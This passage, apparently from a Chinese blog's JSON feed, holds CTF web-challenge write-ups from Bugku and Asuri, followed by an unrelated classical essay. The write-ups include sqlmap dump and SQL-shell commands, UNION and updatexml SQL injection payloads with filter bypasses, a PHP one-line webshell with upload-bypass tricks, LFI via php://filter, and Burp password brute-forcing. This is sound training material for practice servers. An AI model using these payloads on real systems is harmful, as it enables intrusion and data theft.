security）\n1python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;  -D security --tables\n\n5、暴力查询所有的表\n1python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;   --tables\n\n6、列出 security 库中 users 表中的所有列\n1python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;   -D security -T users --columns\n\n(-D dbname 指定数据库名称、-T tablename：指定某数据表的名称、—columns：列出指定表上的所有列)\n7、导出三个数据列中所有的数据\n1python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;   -D security -T users -C id,username,password --dump\n\n8、提供一个 sql shell\n1python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --sql-shell\n\nPOST 请求\n1python sqlmap.py -u http:&#x2F;&#x2F;114.55.36.69:8010&#x2F; --date &quot;word&#x3D;1&amp;number&#x3D;5&quot; --dbs\n\n秋名山老司机（bugku）&amp; 快速计算（Asuri）两道题都是快速计算，需要写脚本，不完全一样。\n秋名山老司机没有输入框，直接post\n1234567891011import reimport requestss = requests.Session()r = s.get(\"http://123.206.87.240:8002/qiumingshan/\")searchObj = re.search(r'^&lt;div&gt;(.*)=\\?;&lt;/div&gt;$', r.text, re.M | re.S)d = &#123;\"value\": eval(searchObj.group(1))&#125;r = s.post(\"http://123.206.87.240:8002/qiumingshan/\", data=d)print(r.text)\n\n不知道value咋来的，题目有问题\nAsuri上这道很清晰，有输入框和submit，返回值的name是answer，中间用eval()函数计算正则分割出来的表达式。新的post要传    headers，不然题目答案服务器对不上号。python程序直接运行即可返回flag。\n123456789101112import reimport requestss = requests.Session()r = s.get(\"http://47.102.107.100:39010/\")print(re.findall(\"&lt;hr&gt;(.*?)&lt;hr&gt;\",r.text)[0])d = &#123;    \"answer\": eval(re.findall(\"&lt;hr&gt;(.*?)&lt;hr&gt;\",r.text)[0])    &#125;r = s.post(\"http://47.102.107.100:39010/\", data=d, headers=s.cookies)print(r.text)\n\n速度要快（bugku）查看源代码, Elements中有提示&lt;!-- OK ,now you have to post the margin what you find --&gt;，要把发现的信息通过margin这个参数post过去，margin是css属性，设置一个元素所有外边距的宽度，或者设置各边上外边距的宽度。\n点击 Network, 查看相关网络请求信息，headers里有一条flag，并且是用base64编码的，但是发现按F5刷新flag总是会变。\n\n\n\n\n\n将flag的内容base64解密两次，得到一串数字。解决办法是写脚本，\n123456789101112131415161718import requestsimport base64s=requests.session()#requests库的session会话对象可以跨请求保持某些参数r=s.get(\"http://123.206.87.240:8002/web6/\")# print(r.headers)#flag在header里aaa=r.headers['flag']flag=base64.b64decode(r.headers['flag']).decode().split(\": \")[-1]#base64解密# print(flag)flag1=base64.b64decode(flag).decode()#base64再解密# print(flag1)dic=&#123;\"margin\":flag1&#125;tr=s.post(\"http://123.206.87.240:8002/web6/\",data=dic)#post参数print(tr.text)\n\ncookies欺骗（bugku）网址链接：http://123.206.87.240:8002/web11/\n打开链接是一串很长很长不知道是什么的字符，发现链接变成了http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=\n后面filename是base64编码的，解码后是keys.txt，但用keys.txt替换后网页没有内容。给line赋值也无济于事。\n将index.php也用base64编码，构造urlhttp://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw，但是也没有东西。\n给line赋值1，2，3都能显示不同的代码，于是写一个脚本获得index.php\n123456import requestsa=30for i in range(a):    url=\"http://123.206.87.240:8002/web11/index.php?line=\"+str(i)+\"&amp;filename=aW5kZXgucGhw\"    s=requests.get(url)        print(s.text)\n\n得到index.php\n123456789101112131415161718192021&lt;?php    error_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt;\n\n分析源码，前面判断传参，后面判断 cookie 必须满足 margin=margin 才能访问 keys.php，keys.php也要base64编码。\n\n\n\nnever give up（bugku）网址链接：http://123.206.87.240:8006/test/hello.php\n查看网页源代码，发现了 1p.html，访问view-source:123.206.87.240:8006/test/1p.html\n\n将var Words先base64解码，再根据提示unescape，得到代码如下：\n12345678910111213141516171819202122232425\";if(!$_GET['id'])&#123;\theader('Location: hello.php?id=1');\texit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123;\techo 'no no no no no no no';\treturn ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123;\trequire(\"f4l2a3g.txt\");&#125;else&#123;\tprint \"never never never give up !!!\";&#125;?&gt;\n\n进入urlhttp://123.206.87.240:8006/test/f4l2a3g.txt，可以得到flag。\n你从哪里来(bugku)网址链接：http://123.206.87.240:9009/from.php\n打开只有一句话：are you from google?\n方法是修改 http referer 头\n\nHTTP_REFERER 编辑\nHTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。\n\n抓包后send to Repeater，添加referer，点击go得到flag\n\n各种绕过(bugku)网址链接：http://123.206.87.240:8002/web7/\n要求uname不等于passwd，并且uname和passwd的sha1散列值相等，当uname和passwd是数组时即可绕过\n\nweb8(bugku)网址链接：http://123.206.87.240:8002/web8/\n比较ac和fn这个文件的内容是否相等\n根据题目提示，构造urlhttp://123.206.87.240:8002/web8/flag.txt，看到\n\n这是flag.txt的内容，也就是ac的值，fn自然就是flag.txt，所以构造urlhttp://123.206.87.240:8002/web8/?ac=flags&amp;fn=flag.txt得到flag。\n求 getshell(bugku)网址链接：http://123.206.87.240:8002/web9/index.php\n要image文件不要php，上传一句话木马\n1&lt;?php @eval($_POST['pass']);?&gt;\n\n点击submit后，在burpsuite中尝试修改文件后缀名为php2, php3, php4, php5, phps, pht, phtm, phtml（php 的别名），这题只有php5可以。因为服务端检测的是文件的 MIME 类型，而对这个 MIME 类型的的值的获取是通过 HTTP 请求字段里的 Content-Type 字段 ，所以绕过的方法就是通过修改 Content-Type 的值，比如修改为 image/jpeg；image/png；image/gif等等允许上传类型对应的 MIME 值请求头里的Content-Type 字段，进行大小写绕过，也就是把multipart/form-data 中任意一个字母改成大写\n这里用到的WAF 的基础绕过，向 web 服务器发送畸形请求，也就是并非这个标准的 HTTP 数据包的时候，由于 web 服务器的一些兼容性的特性，会尽力解析这些畸形的数据包。\n关于一句话木马：https://blog.csdn.net/weixin_39190897/article/details/86772765\n关于文件上传限制绕过：https://www.cnblogs.com/askta0/p/9190556.html\n多次(bugku)网址链接：http://123.206.87.240:9004\n点进去之后看到url是http://123.206.87.240:9004/1ndex.php?id=1\n猜测要运用sql注入。并且把id的值改成2，3……每次页面显示的结果都不一样，改到5页面直接提示要用sql注入了。\n修改url后半部分为?id=1&#39;and1=1--+，页面也显示ERROR，双写and，改成?id=1&#39;anandd 1=1--+就不报错，说明and被过滤掉了。\n这里就要用到异或注入，异或是两个条件相同（同真或同假）时为假\n1http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1&#39;^(length(&#39;union&#39;)!&#x3D;0)--+\n\n如果返回页面显示正常，那就证明 length (‘union’)==0 的，也就是 union 被过滤了，同理测试出被过滤的字符串有：and，or，union，select，都用双写来绕过。\n具体过程参考上面“成绩单”，爆表：这里information里也有or\n1?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database()--+\n\n页面显示flag1,hint\n爆字段：\n1?id&#x3D;-1&#39; ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;&#39;flag1&#39;--+\n\n页面显示flag1,address\n爆数据：\n1?id&#x3D;-1&#39; ununionion seselectlect 1, group_concat(flag1) from flag1--+\n\n页面显示usOwycTju+FTUUzXosjr，以为是flag，结果提交不对。\n把上一条爆数据改成\n1?id&#x3D;-1&#39; ununionion seselectlect 1, group_concat(address) from flag1--+\n\n得到下一关地址。\n这里利用 updatexml() 函数报错注入\n基础知识：https://blog.csdn.net/zpy1998zpy/article/details/80631036\n总之是以～开头的内容不是 xml 格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。\npayload:\n123456# 查数据表http:&#x2F;&#x2F;120.24.86.145:9004&#x2F;Once_More.php?id&#x3D;1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#39;~&#39;),3) %23# 查字段?id&#x3D;1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag2&#39;),&#39;~&#39;),3) %23  # 查数据?id&#x3D;1&#39; and updatexml(1,concat(&#39;~&#39;,(select flag2 from flag2),&#39;~&#39;),3) %23\n\n这里%23就是#，但是直接输#，url没能成功转成%23我不知道为什么，写成和第一关一样的--+也是可以的，同时第一关的--+写成%23也可以。updatexml的第一个参数1和第三个参数3都是anything，随便输。\n123Q：SQL 的注释不是 “--” 吗，为什么还要补上一个 “+” 呢？A：SQL 注释是 -- 加个空格，在 url 里面空格会被忽略掉，而 + 在 url 里面等于空格，--+ 和 --a 或 --b 都是为了使空格生效\n\n123Q:为什么第一关的id赋值-1A:只要不是 1，2，3，4，5 其中一个就行,为了把前面查询的数据置空 &lt;——（我没看懂啥意思）\n\nflag.php(bugku)网址链接：http://123.206.87.240:8002/flagphp/\n点击 login是没反应的。题目提示是hint，将 hint 赋值为 1，然后就出来源代码了……\n源代码的意思是cookie赋值ISecer，要让cookie的反序列化是KEY，但是这时候KEY还没有被赋值。\n序列化和反序列化：\nJava 序列化就是指把 Java 对象转换为字节序列的过程\nJava 反序列化就是指把字节序列恢复为 Java 对象的过程。\n更多知识：https://www.jianshu.com/p/98b15a0e6806\n","thumbnail":"https://s2.ax1x.com/2020/01/19/1PCcTK.jpg","plink":"https://yuyuoo.github.io/2020/02/10/ctf-web-WriteUp-2-Asuri-Bugku/"},{"title":"ctf-web-WriteUp-Asuri-bugku","date":"2020-02-10T06:37:14.000Z","date_formatted":{"ll":"Feb 10, 2020","L":"02/10/2020","MM-DD":"02-10"},"updated":"2020-02-10T06:38:44.583Z","content":"\n年纪大了，方法总结的东西不写下来一会儿就忘了 \n\nweb2(bugku) &amp; 佛说 -- 白给(asuri)网址链接：\nhttp://120.24.86.145:8002/web2/\n47.102.107.100:39002\n直接按F12，隐藏在Elements里\n\n\n\n\n\nAsuri另外一题白给2，按F12，Console里点击链接跳转\n\n\n\n\n\n就能看到flag了\n佛说 -- 白给 3网址链接：http://47.102.107.100:39004/\n按F12，按F5刷新，点Network，隐藏在请求头Header里了\n\n\n\n\n\n佛说 -- 白给 4网址前加view-source：看源码\n\n\n\n\n\n计算器(bugku)网址链接：http://123.206.87.240:8002/yanzhengma/\n出来的计算题是随机的，幸运的时候答案是个位数，点验证就获得了flag，不幸运的时候答案多余1位数，但框内只能填1位数，查看源码，修改输入框的maxlength限制，改为&gt;=1即可，输入多位答案，点击验证，跳出flag\n\n\n\n\n\nweb 基础 $GET &amp; web 基础 $POST &amp; 点击一百万次(bugku)两种最常用的 HTTP 方法是：GET 和 POST\nGET - 从指定的资源请求数据。POST - 向指定的资源提交要被处理的数据Get方法\n1/test/demo_form.asp?name1=value1&amp;name2=value2\n\nGET 请求可被缓存GET 请求保留在浏览器历史记录中GET 请求可被收藏为书签GET 请求不应在处理敏感数据时使用GET 请求有长度限制GET 请求只应当用于取回数据POST 方法\n查询字符串（名称 / 值对）是在 POST 请求的 HTTP 消息主体中发送的：\n123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2\n\nPOST 请求不会被缓存POST 请求不会保留在浏览器历史记录中POST 不能被收藏为书签POST 请求对数据长度没有要求web 基础 $GET：\n网址链接：http://123.206.87.240:8002/get/\n\n\n\n\n\n\n\n\n\n\nweb 基础 $POST：\n网址链接：http://123.206.87.240:8002/post/\n\n\n\n\n\n安装火狐的插件hackbar\n\n\n\n\n\n“点击一百万次”\n源码中判断clicks变量是否大于等于1000000，hackbar中post data，填clicks = 1000001得到flag\n矛盾(bugku)网址链接：http://123.206.87.240:8002/get/index1.php\n输入一个不是数字但num==1，==是弱类型比较，如果等号两边类型不同先转换成相同类型，字符串会转成数字，具体是保留字母前的数字，例如 123ab7c 会转成 123，ab7c 会转成 0（字母前没数字就是 0）。这里用Get方法改链接?num=1a。\n\n\n\n\n\nweb3(bugku)网址链接：http://123.206.87.240:8002/web3/\n\n\n用到Burp suite抓包软件，安装后第一次尝试，随机抓取一个地址，查看拦截的请求\n\n\n\n根据官网指示安装CA certification，设置Https代理。\n问题来了，尝试抓包https://www.baidu.com/\n\n\n\n\n\n后面百度莫得界面，forward之后就\n\n\n\n\n\n不知道怎么解决了...\n这题没要求https抓包，抓包后F12看到调试器下面一行字符\n\n\n\n\n\n粘贴进burp自带的decoder，选decoder as html，看到flag\n\n\n\n\n\n域名解析（ bugku）网址链接：123.206.87.240\n域名解析是指把一个域名指向一个 ip，就像通讯录把姓名指向一个电话一样。用burpsuite抓包，直接把host里的ip改成域名即可。\n\n\n\n\n\n你必须让他停下 &amp; 头等舱(bugku)网址链接：http://123.206.87.240:8002/web12/\n123.206.87.240:9009/hd.php\n用到burp repeater，burp repeater作为 burp suite 中一款验证 HTTP 消息的测试工具，通常用于多次重放请求响应和手工修改请求消息的修改后对服务器端响应的消息分析\n这题先抓包，再forward，查看http history，右击捕获到的get数据包，选sent to repeater，在Repeater中点几次Go，找找到flag\n\n\n\n\n\n头等舱打开什么也没有，burpsuite抓包后sent to repeater，Go一次就看到了flag。\n变量(bugku)网址链接：http://123.206.87.240:8004/index1.php\n用到php的知识，打印所有的全局变量，都在$GLOBALS [index] 数组中，index 保存变量的名称。在链接后面加Get请求http://123.206.87.240:8004/index1.php?args=GLOBALS\nweb5（bugku）查看源码，看到一大串符号，是 JS 代码经过 jsfuck 编码的格式，复制粘贴到控制台，回车\n\n\n\n\n\n网站被黑 &amp; 输入密码查看 flag(bugku)都用到爆破\n网址链接：http://123.206.87.240:8002/webshell/\nhttp://123.206.87.240:8002/baopo/\n根据提示，虽然没什么用，但是经常遇到，webshell，猜测这个网站存在 webshell\nwebshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。\n猜测：http://123.206.87.240:8002/webshell/shell.php\n要填pass，用burpsuite抓包，随便填一个如admin，forward放行，这时burpsuite\n\n\n\n\n\nRaw空白处右击，sent to Intruder。\n在Intruder中Payload Options的Add from list处选Password，右上角Intruder--&gt;start attact，等待结果\n\n\n\n\n\n将结果按Length升序排序，第一个是hack，选中，下方Response中找到flag。\n\n\n\n\n\n下一题“输入密码查看 flag”\n抓包，放行，随意输入5位如12345，放行，sent to intruder，在 Positions 中点击 clear 清除 burp 认为需要猜测的密码，然后选中 12345 (也就是我们刚才输入的密码，点击 add)，改Payloads中的设置，\n\n\n\n\n\nOptions中设置Number of threads为100，等待后结果为13579，得到flag。\n管理员系统(bugku)网址链接：http://123.206.31.85:1003/\n随便输入一个用户名和密码，提示请联系本地管理员登录。\n直接F12有一串字符dGVzdDEyMw==，base64解码得到test123，猜想是密码，用户名随便填一个admin，用burpsuite抓包，填用户名和密码后伪装成本地访问，改包：Headers 中增添一对键值对： X-Forwarded-For : 127.0.0.1，X-Forwarded-For 是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址，但是这个 IP 却未必是真实的。一些开发者为了获取客户 IP，经常会使用 request.remote_ip 来获得用户 IP。但是很多用户都是通过代理来访问服务器的，如果使用 remote_ip 这个全局变量来获取 IP，开发者往往获得的是代理服务器的 IP，并不是用户真正的 IP。\n放行，得到flag。\n\n\n\n\n\nwab4(bugku)\n\n\n\n\n提示要unescape\n在线unescape这一大段，得到一串字符，填入框内submit得到flag。\nflag 在 index 里（bugku）网址链接：http://123.206.87.240:8005/post/index.php?file=show.php\n这里用到一个读取 php 文件源码的方法，是文件包含漏洞（本地文件包含（Local File Include），简称 LFI）。构造 URL：http://123.206.87.240:8005/post/index.php?file=php://filter/read/convert.base64-encode/resource=index.php\n然后来解释 php://filter/read/convert.base64-encode/resource=index.php\n首先这是一个 file 关键字的 get 参数传递，php:// 是一种协议名称，php://filter/ 是一种访问本地文件的协议，/read=convert.base64-encode /表示读取的方式是 base64 编码后，resource=index.php表示目标文件为 index.php。输入这个链接，抓包，再放行，这样就能读取文件源码并以 base64 的 方式输出。将 base64 码解码就拿到 flag 了。\n备份是个好习惯(bugku)备份文件一般情况是在后缀名后加的 .swp，.bak，于是将 URL 改成 123.206.87.240:8002/web16/index.php.bak，回车，下载到一个 php 文件，\n123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;    echo $flag.\"取得flag\";&#125;?&gt;\n\n网上说双写key绕过str_replace，这个函数就是把$str里的key替换成空，双写成kkeyey或者kekeyy都行，key1和key2不同但md5加密值要相同\n构造两个md5值都为0e开头的\n1http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web16&#x2F;index.php?kekeyy1&#x3D;s878926199a&amp;kekeyy2&#x3D;s155964671a\n\n或者利用无法 hash 的数组，返回空来绕过\n1http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web16&#x2F;index.php?kkeyey1[]&#x3D;1&amp;kkeyey2[]&#x3D;2\n\n都能得到flag。\n","thumbnail":"https://s2.ax1x.com/2020/01/19/1PCyex.jpg","plink":"https://yuyuoo.github.io/2020/02/10/ctf-web-WriteUp-Asuri-bugku/"},{"title":"项脊轩志","date":"2020-02-10T06:34:45.000Z","date_formatted":{"ll":"Feb 10, 2020","L":"02/10/2020","MM-DD":"02-10"},"updated":"2020-02-10T06:35:45.901Z","content":"项脊轩，旧南阁子也。室仅方丈，可容一人居。百年老屋，尘泥渗漉，雨泽下注；每移案，顾视，无可置者。又北向，不能得日，日过午已昏。余稍为修葺，使不上漏。前辟四窗，垣墙周庭，以当南日，日影反照，室始洞然。又杂植兰桂竹木于庭，旧时栏楯，亦遂增胜。借书满架，偃仰啸歌，冥然兀坐，万籁有声；而庭堦寂寂，小鸟时来啄食，人至不去。三五之夜，明月半墙，桂影斑驳，风移影动，珊珊可爱。\n然余居于此，多可喜，亦多可悲。先是庭中通南北为一。迨诸父异爨，内外多置小门，墙往往而是。东犬西吠，客逾庖而宴，鸡栖于厅。庭中始为篱，已为墙，凡再变矣。家有老妪，尝居于此。妪，先大母婢也，乳二世，先妣抚之甚厚。室西连于中闺，先妣尝一至。妪每谓余曰：” 某所，而母立于兹。” 妪又曰：” 汝姊在吾怀，呱呱而泣；娘以指叩门扉曰：‘儿寒乎？欲食乎？’吾从板外相为应答。” 语未毕，余泣，妪亦泣。余自束发，读书轩中，一日，大母过余曰：” 吾儿，久不见若影，何竟日默默在此，大类女郎也？” 比去，以手阖门，自语曰：” 吾家读书久不效，儿之成，则可待乎！” 顷之，持一象笏至，曰：” 此吾祖太常公宣德间执此以朝，他日汝当用之！” 瞻顾遗迹，如在昨日，令人长号不自禁。\n轩东，故尝为厨，人往，从轩前过。余扃牖而居，久之，能以足音辨人。轩凡四遭火，得不焚，殆有神护者。\n项脊生曰：” 蜀清守丹穴，利甲天下，其后秦皇帝筑女怀清台；刘玄德与曹操争天下，诸葛孔明起陇中。方二人之昧昧于一隅也，世何足以知之，余区区处败屋中，方扬眉、瞬目，谓有奇景。人知之者，其谓与坎井之蛙何异？”\n余既为此志，后五年，吾妻来归，时至轩中，从余问古事，或凭几学书。吾妻归宁，述诸小妹语曰：” 闻姊家有阁子，且何谓阁子也？” 其后六年，吾妻死，室坏不修。其后二年，余久卧病无聊，乃使人复葺南阁子，其制稍异于前。然自后余多在外，不常居。\n\n庭有枇杷树，吾妻死之年所手植也，今已亭亭如盖矣。\n\n","thumbnail":"https://s2.ax1x.com/2020/01/19/1PPK76.jpg","plink":"https://yuyuoo.github.io/2020/02/10/项脊轩志/"}]